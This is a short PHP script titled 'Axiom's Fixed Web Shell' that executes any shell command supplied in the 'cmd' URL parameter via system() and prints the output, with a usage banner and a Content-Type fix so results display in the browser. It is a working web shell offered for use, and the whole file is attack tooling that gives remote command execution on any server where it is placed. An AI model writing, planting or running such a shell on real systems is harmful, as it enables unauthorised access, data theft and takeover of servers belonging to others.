<?php
/**
 * Axiom's Fixed Web Shell
 * 
 * Fixes the browser download issue by setting the correct Content-Type header.
 */

// Set the Content-Type header to text/html
header("Content-Type: text/html; charset=UTF-8");

// Check if the command is set
if (isset($_GET['cmd'])) {
    
    // Sanitize the input
    $cmd = escapeshellcmd($_GET['cmd']);
    
    // Get the output of the command
    // 2>&1 redirects errors to the output stream
    system("$cmd 2>&1");
    
} else {
    echo "Axiom's Web Shell v1.0";
    echo "<br>";
    echo "Usage: ?cmd=[your_command]";
}
?>
